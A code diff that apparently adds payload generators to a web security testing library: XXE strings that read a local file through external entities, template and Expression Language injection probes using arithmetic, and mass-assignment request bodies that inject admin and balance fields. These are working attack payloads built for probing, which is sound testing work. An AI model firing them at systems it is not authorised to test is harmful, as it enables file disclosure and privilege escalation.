@@ -928,3 +928,58 @@ def load_jwt_attack_payloads(token: str, secret_guesses: List[str] = None) -> Li
                 "notes": "structure for blank-secret HS256 test — caller must sign with '' HMAC"})
 
     return out
+
+
+def load_xxe_payloads(canary_path: str = "/etc/hostname") -> List[str]:
+    """XXE payloads targeting file read via external entity expansion.
+
+    Returns XML strings with SYSTEM entity pointing to canary_path.
+    Covers: classic DOCTYPE, parameter entity, XInclude, SVG embed.
+    """
+    _f = canary_path
+    return [
+        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{_f}">]><foo>&xxe;</foo>',
+        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{_f}">]><foo attr="&xxe;"/>',
+        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://{_f}">%xxe;]><foo/>',
+        f'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{_f}">]>'
+        f'<text>&xxe;</text></svg>',
+        f'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://{_f}"/></foo>',
+    ]
+
+
+def load_el_injection_payloads(a: int, b: int) -> List[str]:
+    """Expression Language injection math-proof payloads for SpEL, Thymeleaf, Jinja2, FreeMarker.
+
+    Uses arithmetic (a + b = expected) as proof expression — caller checks for expected in response.
+    Returns expression strings (caller wraps in the right HTTP parameter).
+    """
+    _expr = f"{a}+{b}"
+    return [
+        f"${{{_expr}}}",
+        f"#{{{_expr}}}",
+        f"{{{{ {_expr} }}}}",
+        f"${{{{{_expr}}}}}",
+        f"${{({_expr})}}",
+        f"<%= {_expr} %>",
+        f"${{{_expr}?string}}",
+        f"#{{({_expr})}}",
+        f"@({_expr})",
+    ]
+
+
+def load_mass_assignment_payloads(admin_field: str = "role",
+                                   admin_value: str = "admin") -> List[dict]:
+    """Mass assignment payloads: privileged extra fields to inject alongside normal params.
+
+    Returns dicts to merge into the POST/PUT body for privilege escalation probes.
+    """
+    return [
+        {admin_field: admin_value},
+        {"role": "admin", "isAdmin": True},
+        {"is_admin": True, "admin": True},
+        {"privilege": "admin", "permissions": ["admin", "read", "write"]},
+        {"user_type": "admin", "access_level": 99},
+        {"role": "superuser", "scope": "admin"},
+        {"balance": 99999, "credits": 99999},
+        {"email_verified": True, "is_staff": True, "is_superuser": True},
+    ]
